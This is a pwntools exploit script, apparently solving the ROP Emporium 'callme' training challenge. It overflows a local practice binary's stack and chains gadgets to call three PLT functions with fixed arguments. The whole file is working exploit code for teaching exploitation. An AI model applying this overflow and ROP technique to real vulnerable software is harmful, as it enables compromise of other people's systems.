from pwn import *

io = process('./callme')
elf = ELF('./callme')

rdi = 0x4009a3
rsirdx = 0x40093d

payload = cyclic(32 + 8)
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(rsirdx) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(elf.plt['callme_one'])
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(rsirdx) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(elf.plt['callme_two'])
payload += p64(rdi) + p64(0xdeadbeefdeadbeef)
payload += p64(rsirdx) + p64(0xcafebabecafebabe) + p64(0xd00df00dd00df00d)
payload += p64(elf.plt['callme_three'])

io.sendlineafter(b'> ', payload)
io.interactive()